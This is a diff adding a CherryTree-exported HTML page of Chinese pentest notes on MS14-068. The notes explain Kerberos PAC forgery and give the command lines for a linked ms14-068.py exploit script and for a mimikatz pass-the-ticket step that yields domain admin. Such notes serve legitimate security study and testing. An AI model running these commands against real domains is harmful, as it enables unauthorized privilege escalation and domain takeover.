@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>MS14-068</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>MS14-068</h1><br/>MS14-068过程：<br /><br />• 请求没有PAC的Kerberos TGT认证票据作为标准用户，DC回复TGT<br />• 生成一个伪造的PAC，没有密钥，所以生成的PAC使用域用户的密码数据用MD5算法而不是HMAC_MD5“签名”。<br />• 作为TGS服务票据请求的一部分，使用伪造的PAC作为授权数据发送无PAC的TGT到DC。<br />• DC似乎被这个混淆了，所以它放弃了用户发送的不含PAC的TGT，创建一个新的TGT，并将伪造的PAC插入到它自己的授权数据中，并将这个TGT发送给用户。<br />• 这个伪造PAC的TGT使得用户可以成为易受攻击的DC上的域管理员。<br /><br /><br />whoami /user<br /><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\612-ms14-068.py">Linked file: ms14-068.py </a></td></tr></table><br />python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机<br /><br />产生缓存的票据,在当前Kali下生成之后再放到域用户机器中<br /><br /><br />利用mimikatz工具将得到的TGT_domainuser@SERVER.COM.ccache写入内存，创建缓存证书：<br />mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit<br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
